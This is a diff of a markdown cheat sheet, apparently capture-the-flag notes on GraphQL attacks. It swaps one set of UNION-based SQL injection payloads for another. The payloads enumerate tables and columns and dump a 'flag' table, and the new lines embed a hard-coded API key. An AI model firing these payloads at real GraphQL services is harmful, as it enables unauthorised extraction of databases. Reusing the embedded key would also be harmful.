@@ -52,11 +52,11 @@ query IntrospectionQuery { __schema { queryType { name } mutationType { name } s
 ## SQLI
 ```bash
 # Table
-{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {username password role}}
+customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"'UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -\") 
 # Column
-{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\") {username password role}}
+customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"'UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='flag'-- -\")
 # Data
-{ user(username: \"x'UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") {username password role}}
+customerByName(apiKey: \"0711a879ed751e63330a78a4b195bbad\", lastName: \"'UNION SELECT 1,id,flag,4 FROM flag-- -\") 
 ```
 ## XSS
 <img width="1548" height="421" alt="image" src="https://github.com/user-attachments/assets/2db00f0f-99af-4275-bccd-eb2c248083b2" />
